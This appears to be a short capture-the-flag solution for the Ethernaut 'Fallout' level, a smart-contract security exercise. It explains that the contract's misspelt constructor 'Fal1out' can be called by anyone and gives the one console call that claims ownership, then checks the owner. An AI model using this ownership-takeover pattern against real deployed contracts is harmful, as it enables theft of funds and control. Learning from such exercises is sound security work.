// LEVEL GOALS:
// 1. Claim ownership of contract
// -------------------------------
// STRATEGY:
// 1. Noticed "Fal1out" in Constructor has a 1 in the name
// 2. Exploit typo by calling the misspelt constructor to claim ownership
// -------------------------------------------- 
// STEPS TO COMPLETE LEVEL
// -----------------------

// 1 - Call Fal1out() to claim ownership
contract.Fal1out({from: player, value: toWei("0.00001"), gas: 1000000})

// 2 - Check if I pwned the contract
await contract.owner() // I did

